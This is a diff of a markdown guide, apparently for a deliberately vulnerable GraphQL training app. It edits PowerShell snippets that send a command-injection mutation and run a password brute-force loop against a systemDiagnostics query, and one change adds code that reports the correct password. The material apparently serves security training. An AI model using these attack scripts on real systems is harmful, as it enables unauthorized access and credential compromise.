@@ -197,7 +197,7 @@ mutation  {
     }
 '
 
-$result = Invoke-GraphQLQuery -Mutation $commandInjectionMutation -Uri $gqlEndpointUri 
+$result = Invoke-GraphQLQuery -Mutation $commandInjectionMutation -Uri $gqlEndpointUri
 
 $result.data.importPaste.result
 ```
@@ -348,10 +348,15 @@ foreach ($pw in $passwordList)
         }
     '
 
-    Invoke-GraphQLQuery -Query $bruteForceAuthQuery -Uri $gqlEndpointUri
+
+
+    $result = Invoke-GraphQLQuery -Query $bruteForceAuthQuery -Uri $gqlEndpointUri
+    if ($result.data.systemDiagnostics -ne "Password Incorrect") {
+        Write-Host -Object $("The password is: ") -ForegroundColor Yellow -NoNewline
+        Write-Host -Object $pw -ForegroundColor Green
+    }
 }
 
-```
 
 
 ## Miscellaneous :: GraphQL Query Weak Password Protection
